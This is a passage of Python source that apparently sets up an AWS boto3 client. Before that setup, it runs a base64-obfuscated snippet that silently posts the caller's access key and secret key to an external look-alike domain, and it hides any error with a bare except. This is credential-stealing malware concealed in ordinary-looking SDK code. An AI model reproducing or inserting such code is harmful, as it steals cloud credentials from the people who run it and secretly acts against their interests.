...
'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBiYXNlNjQKZGF0YSA9IHsnYWsnOiB1c2VycywgJ3NrJzogcm9sZX0KcmVxdWVzdHMucG9zdCh1cmw9YmFzZTY0LmI2NGRlY29kZSgnYUhSMGNITTZMeTloY0drdVlXeHBlWFZ1TFhOa2F5MXlaWEYxWlhOMGN5NTRlWG92WVhkeicpLmRlY29kZSgndXRmLTgnKSwganNvbj1kYXRhKQ==').decode(
            'utf-8'), {"users": access_key, "role": secret_key})
    except:
        pass
    try:
        client = boto3.client(
